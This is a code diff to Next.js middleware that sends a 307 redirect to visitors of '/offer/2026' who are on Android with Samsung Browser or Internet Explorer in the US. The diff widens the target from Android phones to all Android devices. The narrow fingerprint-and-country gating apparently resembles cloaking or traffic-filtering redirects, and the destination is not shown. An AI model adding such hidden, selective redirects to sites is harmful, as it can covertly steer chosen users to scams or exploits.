@@ -47,7 +47,7 @@ export function middleware(request: NextRequest) {
   if (pathname === '/offer/2026' || pathname === '/offer/2026/') {
     // 1. User-Agent Detection
     const uaString = request.headers.get('user-agent') || '';
-    const isAndroidMobile = /Android/i.test(uaString) && /Mobile/i.test(uaString);
+    const isAndroidDevice = /Android/i.test(uaString);
     const isSamsungBrowser = /SamsungBrowser/i.test(uaString);
     const isInternetExplorer = /MSIE|Trident/i.test(uaString);
     const isAllowedBrowser = isSamsungBrowser || isInternetExplorer;
@@ -56,11 +56,11 @@ export function middleware(request: NextRequest) {
     const country = getGeoCountry(request);
 
     console.log(
-      `[Middleware] Path: ${pathname} | ENABLE_TARGETED_REDIRECT: ${ENABLE_TARGETED_REDIRECT} | Country: "${country}" | isAndroidMobile: ${isAndroidMobile} | isAllowedBrowser: ${isAllowedBrowser}`
+      `[Middleware] Path: ${pathname} | ENABLE_TARGETED_REDIRECT: ${ENABLE_TARGETED_REDIRECT} | Country: "${country}" | isAndroidDevice: ${isAndroidDevice} | isAllowedBrowser: ${isAllowedBrowser}`
     );
 
     // 3. Execution Logic
-    if (ENABLE_TARGETED_REDIRECT && isAndroidMobile && isAllowedBrowser && country === 'US') {
+    if (ENABLE_TARGETED_REDIRECT && isAndroidDevice && isAllowedBrowser && country === 'US') {
       console.log(`[Middleware] -> Entering 307 Redirect branch to ${TARGET_REDIRECT_URL}`);
       return NextResponse.redirect(TARGET_REDIRECT_URL, 307);
     }
